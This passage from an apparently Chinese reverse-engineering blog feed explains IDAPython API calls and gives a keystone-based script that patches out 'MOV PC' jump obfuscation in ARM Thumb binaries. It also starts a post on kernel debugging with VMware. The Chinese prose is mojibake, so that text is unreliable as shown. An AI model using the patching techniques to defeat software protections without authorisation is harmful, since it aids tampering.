&#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdd80 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bddd0&#x27;, &#x27;0x1a9f16be280&#x27;]</span><br><span class="line">0x1a9f16bd560 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bd920&#x27;]</span><br><span class="line">0x1a9f16bd1f0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd240&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be0f0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be690&#x27;]</span><br><span class="line">0x1a9f16bddd0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be280 -&gt; [&#x27;0x1a9f16be230&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd920 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd970&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd240 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bcfc0&#x27;]</span><br><span class="line">0x1a9f16be690 -&gt; [&#x27;0x1a9f16be640&#x27;, &#x27;0x1a9f16be6e0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be230 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be7d0&#x27;]</span><br><span class="line">0x1a9f16bd970 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd9c0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bcfc0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd010&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be640 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be6e0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be7d0 -&gt; [&#x27;0x1a9f16be780&#x27;, &#x27;0x1a9f16be820&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd9c0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bda10&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd010 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bca60&#x27;]</span><br><span class="line">0x1a9f16be780 -&gt; [&#x27;0x1a9f16be730&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be820 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bda10 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bca60 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bcab0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be730 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be190&#x27;]</span><br><span class="line">0x1a9f16bcab0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bcb00&#x27;, &#x27;0x1a9f16bc970&#x27;]</span><br><span class="line">0x1a9f16be190 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16be1e0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bcb00 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bd0b0&#x27;]</span><br><span class="line">0x1a9f16bc970 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bc9c0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be1e0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bdce0&#x27;]</span><br><span class="line">0x1a9f16bd0b0 -&gt; [&#x27;0x1a9f16bd060&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bc9c0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bca10&#x27;, &#x27;0x1a9f16bc920&#x27;]</span><br><span class="line">0x1a9f16bdce0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd060 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bd2e0&#x27;]</span><br><span class="line">0x1a9f16bca10 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bcb50&#x27;]</span><br><span class="line">0x1a9f16bc920 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd2e0 -&gt; [&#x27;0x1a9f16bd290&#x27;, &#x27;0x1a9f16bd330&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bcb50 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bcba0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd290 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bd5b0&#x27;]</span><br><span class="line">0x1a9f16bd330 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd380&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bcba0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bd150&#x27;]</span><br><span class="line">0x1a9f16bd5b0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd600&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd380 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd3d0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd150 -&gt; [&#x27;0x1a9f16bd100&#x27;, &#x27;0x1a9f16bd1a0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd600 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd650&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd3d0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bd6f0&#x27;]</span><br><span class="line">0x1a9f16bd100 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd1a0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bd420&#x27;]</span><br><span class="line">0x1a9f16bd650 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd6f0 -&gt; [&#x27;0x1a9f16bd6a0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd420 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd470&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd6a0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bda60&#x27;]</span><br><span class="line">0x1a9f16bd470 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bda60 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bdab0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdab0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bdb00&#x27;, &#x27;0x1a9f16bdf10&#x27;]</span><br><span class="line">0x1a9f16bdb00 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bd740&#x27;]</span><br><span class="line">0x1a9f16bdf10 -&gt; [&#x27;0x1a9f16bdec0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd740 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd790&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdec0 -&gt; [&#x27;0x1a9f16bde70&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be3c0&#x27;]</span><br><span class="line">0x1a9f16bd790 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bd7e0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bde70 -&gt; [&#x27;0x1a9f16bde20&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be3c0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16be410&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bd7e0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bde20 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be320&#x27;]</span><br><span class="line">0x1a9f16be410 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16be460&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be320 -&gt; [&#x27;0x1a9f16be2d0&#x27;, &#x27;0x1a9f16be370&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be460 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16be4b0&#x27;, &#x27;0x1a9f16bdf60&#x27;]</span><br><span class="line">0x1a9f16be2d0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be870&#x27;]</span><br><span class="line">0x1a9f16be370 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be4b0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdf60 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be870 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16be8c0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be8c0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16be910&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be910 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16be960&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be960 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16be9b0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be9b0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bffd0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bffd0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16c0020&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16c0020 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16c0070&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16c0070 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16c00c0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16c00c0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16c0110&#x27;, &#x27;0x1a9f16be550&#x27;]</span><br><span class="line">0x1a9f16c0110 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16c0160&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be550 -&gt; [&#x27;0x1a9f16be500&#x27;, &#x27;0x1a9f16be5a0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16c0160 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16c01b0&#x27;, &#x27;0x1a9f16be5f0&#x27;]</span><br><span class="line">0x1a9f16be500 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be000&#x27;]</span><br><span class="line">0x1a9f16be5a0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16be0a0&#x27;]</span><br><span class="line">0x1a9f16c01b0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be5f0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be000 -&gt; [&#x27;0x1a9f16bdfb0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16be0a0 -&gt; [&#x27;0x1a9f16be050&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdfb0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x1a9f16bdb50&#x27;]</span><br><span class="line">0x1a9f16be050 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdb50 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bdba0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdba0 -&gt; [&#x27;0x0&#x27;, &#x27;0x1a9f16bdbf0&#x27;, &#x27;0x0&#x27;]</span><br><span class="line">0x1a9f16bdbf0 -&gt; [&#x27;0x0&#x27;, &#x27;0x0&#x27;, &#x27;0x0&#x27;]</span><br></pre></td></tr></table></figure>

<h2 id="ä¸IDAäº¤äº’"><a href="#ä¸IDAäº¤äº’" class="headerlink" title="ä¸IDAäº¤äº’"></a>ä¸IDAäº¤äº’</h2><h3 id="è®©IDAç”Ÿæˆä¿¡æ¯æ›´å…·å¯æ“ä½œæ€§"><a href="#è®©IDAç”Ÿæˆä¿¡æ¯æ›´å…·å¯æ“ä½œæ€§" class="headerlink" title="è®©IDAç”Ÿæˆä¿¡æ¯æ›´å…·å¯æ“ä½œæ€§"></a>è®©IDAç”Ÿæˆä¿¡æ¯æ›´å…·å¯æ“ä½œæ€§</h3><h4 id="get-name-value-from-name-typ-value-get-dtype-size-dtype"><a href="#get-name-value-from-name-typ-value-get-dtype-size-dtype" class="headerlink" title="get_name_value(_from, name) -&gt; (typ, value) | get_dtype_size(dtype)"></a>get_name_value(_from, name) -&gt; (typ, value) | get_dtype_size(dtype)</h4><p>è·å–IDAç”Ÿæˆä¿¡æ¯å¯¹åº”çš„å€¼å’Œå€¼çš„ç±»å‹ ä¾‹å¦‚:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F04%2F20240904-220744.png" alt="image-20240904220744244"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># test.py</span></span><br><span class="line"><span class="keyword">import</span> idaapi, idc</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Type:<span class="subst">&#123;idaapi.get_name_value(<span class="number">0x40D2C2</span>, <span class="string">&#x27;var_18&#x27;</span>)[<span class="number">0</span>]&#125;</span>\nValue:<span class="subst">&#123;<span class="built_in">hex</span>(idaapi.get_name_value(<span class="number">0x40D2C2</span>, <span class="string">&#x27;var_18&#x27;</span>)[<span class="number">1</span>])&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;NT_SEG:<span class="subst">&#123;idaapi.NT_SEG&#125;</span>, NT_NONE:<span class="subst">&#123;idaapi.NT_NONE&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F04%2F20240904-220843.png" alt="image-20240904220843115"></p>
<p>å…¶ä¸­<code>typ</code>ä»¥åŠåé¢ä¼šå‡ºç°çš„<code>dtype</code>æˆå‘˜ä»£è¡¨è¯¥æ•°æ®çš„ç±»å‹ å‚è€ƒ<a href="https://hex-rays.com/products/ida/support/sdkdoc/group__dt__.html">IDA SDK: Operand value types</a> å¦‚æœä¼ å…¥çš„<code>name</code>åœ¨ç¨‹åºæœªå¼€å§‹è¿è¡Œæ—¶ä¸å­˜åœ¨å€¼æ—¶è¿”å›çš„<code>value</code>æ˜¯-1ä¸”<code>typ</code>ä¸º<code>NT_NONE(0x0)</code> å¦åˆ™<code>value</code>ä¸ºè¿™ä¸ªIDAåç§°æ‰€å¯¹åº”çš„çœŸå®å€¼ å¯ä»¥ç”¨æ¥ç¼–å†™æ±‡ç¼–ä»£ç  è‹¥ä¸ç¡®å®š<code>_from</code>çš„è¯åº”è¯¥ä½¿ç”¨<code>idc.BADADDR</code>å ä½</p>
<p><code>get_dtype_size(dtype)</code> è¿”å›æŸä¸ªdtypeä»£å·å¯¹åº”çš„æ•°æ®ç±»å‹é•¿åº¦(in bytes)</p>
<h4 id="get-item-head-ea-int-get-item-size-ea-int"><a href="#get-item-head-ea-int-get-item-size-ea-int" class="headerlink" title="get_item_head(ea) -&gt; int | get_item_size(ea) -&gt; int"></a>get_item_head(ea) -&gt; int | get_item_size(ea) -&gt; int</h4><p><code>get_item_head</code>ç”¨äºè·å–IDAä¸­æŸä¸ªåœ°å€æ‰€åœ¨Itemçš„é¦–åœ°å€ è€Œ<code>get_item_size</code>ç”¨äºè·å–æŸä¸ªåœ°å€è·ç¦»æ‰€åœ¨Itemç»“å°¾åœ°å€çš„é•¿åº¦ ä¾‹å¦‚æ±‡ç¼–æŒ‡ä»¤:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F05%2F20240905-134621.png" alt="image-20240905134621494"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi, idc</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;The Start address of the ITEM at 0x40D2A8 : <span class="subst">&#123;<span class="built_in">hex</span>(idaapi.get_item_head(<span class="number">0x40D2A8</span>))&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;The lenth of the rest of the ITEM at 0x40D2A9 : <span class="subst">&#123;<span class="built_in">hex</span>(idaapi.get_item_size(<span class="number">0x40D2A9</span>))&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F05%2F20240905-194256.png" alt="image-20240905194255927"></p>
<h4 id="class-insn-t-decode-insn-insn-ea-int"><a href="#class-insn-t-decode-insn-insn-ea-int" class="headerlink" title="class insn_t() | decode_insn(insn, ea) -&gt; int"></a>class insn_t() | decode_insn(insn, ea) -&gt; int</h4><p><code>insn_t</code>å¯¹è±¡å®ä¾‹åŒ–æ—¶ä¸éœ€è¦ä¹Ÿä¸èƒ½ä¼ é€’ä»»ä½•å‚æ•° å®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡æ‰€æœ‰çš„æˆå‘˜éƒ½è¢«åˆå§‹åŒ–æˆä¸€ä¸ªå›ºå®šçš„åˆå§‹å€¼(å¤§éƒ¨åˆ†æ˜¯-1)  ä½¿ç”¨<code>decode_insn()</code>ä¼ å…¥å·²ç»å®ä¾‹åŒ–çš„<code>insn_t</code>å¯¹è±¡å’Œè¦è§£æçš„æŒ‡ä»¤çš„é¦–åœ°å€ å‡½æ•°è¿”å›æŒ‡ä»¤çš„é•¿åº¦(in bytes) æ­¤æ—¶insnå°±è®°å½•äº†è¿™æ¡æŒ‡ä»¤çš„<a href="https://hex-rays.com//products/ida/support/idapython_docs/ida_ua.html#ida_ua.insn_t">æ‰€æœ‰ä¿¡æ¯</a> å…¶ä¸­æœ€é‡è¦çš„æ˜¯è¿™æ¡æŒ‡ä»¤æ“ä½œæ•°(<a href="https://hex-rays.com//products/ida/support/idapython_docs/ida_ua.html#ida_ua.op_t"><code>op_t</code></a>) æ“ä½œæ•°å¯¹è±¡è¿˜åŒ…å«äº†æ›´å¤šç›¸å…³ä¿¡æ¯ ä»‹ç»ä¸€ä¸‹å…¶ä¸­ä¸¤ä¸ªæ¯”è¾ƒå¸¸ç”¨çš„æˆå‘˜</p>
<p><code>insn.ops[n].dtype</code>  : æ“ä½œæ•°çš„æ•°æ®ç±»åˆ« å‚è€ƒ<a href="https://hex-rays.com/products/ida/support/sdkdoc/group__dt__.html">IDA SDK: Operand value types</a></p>
<p><code>insn.ops[n].type</code>    : æ“ä½œæ•°çš„ç±»åˆ« å‚è€ƒ<a href="https://hex-rays.com/products/ida/support/sdkdoc/group__o__.html#gab490f48c733f3d29c700bb5d70ecc198">IDA SDK: Operand types</a></p>
<p><code>insn.ops[n].value</code>  : å¦‚æœè¯¥æ“ä½œæ•°æ˜¯ç«‹å³æ•° è¿”å›è¿™ä¸ªå€¼</p>
<h4 id="get-func-attr-ea-attr-any-set-func-addr-ea-attr-value-int"><a href="#get-func-attr-ea-attr-any-set-func-addr-ea-attr-value-int" class="headerlink" title="get_func_attr(ea, attr) -&gt; any | set_func_addr(ea, attr, value) -&gt; int"></a>get_func_attr(ea, attr) -&gt; any | set_func_addr(ea, attr, value) -&gt; int</h4><p>åˆ†åˆ«ç”¨äºè·å–å’Œè®¾ç½®eaåœ°å€æ‰€åœ¨çš„å‡½æ•°çš„attrå±æ€§ è®¾ç½®å±æ€§æ—¶è¿”å›<code>1</code>è¡¨ç¤ºæˆåŠŸè¿”å›<code>0</code>è¡¨ç¤ºå¤±è´¥</p>
<p>è¿™äº›å±æ€§æ˜¯:</p>
<table>
<thead>
<tr>
<th>Attribution (idc.)</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>FUNCATTR_ARGSIZE</td>
<td>28</td>
</tr>
<tr>
<td>FUNCATTR_COLOR</td>
<td>36</td>
</tr>
<tr>
<td>FUNCATTR_END</td>
<td>4</td>
</tr>
<tr>
<td>FUNCATTR_FLAGS</td>
<td>8</td>
</tr>
<tr>
<td>FUNCATTR_FPD</td>
<td>32</td>
</tr>
<tr>
<td>FUNCATTR_FRAME</td>
<td>16</td>
</tr>
<tr>
<td>FUNCATTR_FRREGS</td>
<td>24</td>
</tr>
<tr>
<td>FUNCATTR_FRSIZE</td>
<td>20</td>
</tr>
<tr>
<td>FUNCATTR_OWNER</td>
<td>16</td>
</tr>
<tr>
<td>FUNCATTR_REFQTY</td>
<td>20</td>
</tr>
<tr>
<td>FUNCATTR_START</td>
<td>0</td>
</tr>
<tr>
<td>FUNC_BOTTOMBP</td>
<td>256</td>
</tr>
<tr>
<td>FUNC_FAR</td>
<td>2</td>
</tr>
<tr>
<td>FUNC_FRAME</td>
<td>16</td>
</tr>
<tr>
<td>FUNC_HIDDEN</td>
<td>64</td>
</tr>
<tr>
<td>FUNC_LIB</td>
<td>4</td>
</tr>
<tr>
<td>FUNC_LUMINA</td>
<td>65536</td>
</tr>
<tr>
<td>FUNC_NORET</td>
<td>1</td>
</tr>
<tr>
<td>FUNC_NORET_PENDING</td>
<td>512</td>
</tr>
<tr>
<td>FUNC_OUTLINE</td>
<td>131072</td>
</tr>
<tr>
<td>FUNC_PURGED_OK</td>
<td>16384</td>
</tr>
<tr>
<td>FUNC_SP_READY</td>
<td>1024</td>
</tr>
<tr>
<td>FUNC_STATIC</td>
<td>8</td>
</tr>
<tr>
<td>FUNC_TAIL</td>
<td>32768</td>
</tr>
<tr>
<td>FUNC_THUNK</td>
<td>128</td>
</tr>
<tr>
<td>FUNC_USERFAR</td>
<td>32</td>
</tr>
</tbody></table>
<h3 id="å¯¹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œæ“ä½œ"><a href="#å¯¹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œæ“ä½œ" class="headerlink" title="å¯¹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œæ“ä½œ"></a>å¯¹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œæ“ä½œ</h3><h4 id="patch-byte-ea-x-bool-patch-bytes-ea-buf-bool"><a href="#patch-byte-ea-x-bool-patch-bytes-ea-buf-bool" class="headerlink" title="patch_byte(ea, x) -&gt; bool | patch_bytes(ea, buf) -&gt; bool"></a>patch_byte(ea, x) -&gt; bool | patch_bytes(ea, buf) -&gt; bool</h4><p>åˆ†åˆ«ç”¨äºå°†eaå¤„çš„1ä¸ªå’Œå¤šä¸ªå­—èŠ‚patchæˆç›®æ ‡å­—èŠ‚<code>x</code>æˆ–ç›®æ ‡å­—èŠ‚ä¸²<code>buf</code> è¿”å›patchçš„ç»“æœæ˜¯å¦æˆåŠŸ</p>
<h5 id="ç”¨IDAå»è™šæ‹Ÿè·³è½¬æ··æ·†"><a href="#ç”¨IDAå»è™šæ‹Ÿè·³è½¬æ··æ·†" class="headerlink" title="ç”¨IDAå»è™šæ‹Ÿè·³è½¬æ··æ·†"></a>ç”¨IDAå»è™šæ‹Ÿè·³è½¬æ··æ·†</h5><p>ä¹‹å‰ä½¿ç”¨Angrç¬¦å·æ‰§è¡Œçš„æ–¹å¼å»è™šæ‹Ÿè·³è½¬æ—¶æåˆ°è¿‡ IDAå¯ä»¥ç›´æ¥è®¡ç®—å‡ºè·³è½¬çš„ç»ˆç‚¹ å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æ¥å¤§å¤§ç®€åŒ–å»é™¤æ··æ·†çš„è¿‡ç¨‹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idaapi, idc, idautils</span><br><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span> * <span class="number">20</span>)</span><br><span class="line">ks = Ks(KS_ARCH_ARM, KS_MODE_THUMB)</span><br><span class="line"></span><br><span class="line">funcs = <span class="built_in">list</span>(idautils.Functions())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(funcs)):</span><br><span class="line">    ea = funcs[i]</span><br><span class="line">    end = idc.get_func_attr(funcs[i], idc.FUNCATTR_END)</span><br><span class="line">    <span class="keyword">while</span> ea &lt; end:</span><br><span class="line">        opcode = idc.GetDisasm(ea).split()</span><br><span class="line">        <span class="keyword">if</span> opcode[<span class="number">0</span>] == <span class="string">&#x27;MOV&#x27;</span> <span class="keyword">and</span> opcode[<span class="number">1</span>] == <span class="string">&#x27;PC,&#x27;</span>:</span><br><span class="line">            new_op = <span class="string">f&quot;B <span class="subst">&#123;<span class="string">&#x27;0x&#x27;</span> + opcode[-<span class="number">1</span>].partition(<span class="string">&#x27;_&#x27;</span>)[<span class="number">2</span>]&#125;</span>&quot;</span></span><br><span class="line">            new_opcode = ks.asm(new_op, ea - <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">            NOP = ks.asm(<span class="string">&#x27;NOP&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="comment"># print(f&quot;0x&#123;ea:08x&#125;: &#123;idc.GetDisasm(ea)&#125; -&gt; &#123;new_op&#125; with &#123;new_opcode&#125;&quot;)</span></span><br><span class="line">            idaapi.patch_bytes(ea - <span class="number">2</span>, <span class="built_in">bytes</span>(NOP * <span class="number">2</span>))</span><br><span class="line">            idaapi.patch_bytes(ea - <span class="number">2</span>, <span class="built_in">bytes</span>(new_opcode))</span><br><span class="line">        lenth = idaapi.decode_insn(idaapi.insn_t(), ea)</span><br><span class="line">        ea += <span class="built_in">max</span>(lenth, <span class="number">2</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>äºŒè¿›åˆ¶</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>Reverse</tag>
        <tag>IDAapi</tag>
      </tags>
  </entry>
  <entry>
    <title>IDAé…åˆVMwareè¿›è¡Œå†…æ ¸(é©±åŠ¨)è°ƒè¯•</title>
    <url>/2024/09/28/IDA%E9%85%8D%E5%90%88VMware%E8%BF%9B%E8%A1%8C%E5%86%85%E6%A0%B8-%E9%A9%B1%E5%8A%A8-%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<p>ä»‹ç»ä¸€ä¸‹å¦‚ä½•ç”¨IDAé…åˆWindbgå’ŒVmwareè°ƒè¯•å†…æ ¸</p>
<span id="more"></span>

<h2 id="è™šæ‹Ÿæœºå‡†å¤‡"><a href="#è™šæ‹Ÿæœºå‡†å¤‡" class="headerlink" title="è™šæ‹Ÿæœºå‡†å¤‡"></a>è™šæ‹Ÿæœºå‡†å¤‡</h2><p>æ–°å¢ä¸€ä¸ªä¸²è¡Œç«¯å£:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-134238.png" alt="image-20240928134238807"></p>
<p>å¦‚æœè®¾å¤‡é‡Œæœ‰æ‰“å°æœºè¦æŠŠæ‰“å°æœºç§»é™¤ å¦åˆ™åŒ…æ‹¬ä»¥ä¸‹æ­¥éª¤ä½¿ç”¨çš„ç®¡é“è¦æ”¹æˆcom2</p>
<p>å‘½ä»¤è¡Œæ‰“å¼€msconfig ç„¶åé…ç½®é»˜è®¤å¯åŠ¨è°ƒè¯•æœº:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F09%2F28%2F20240928-135341.png"></p>
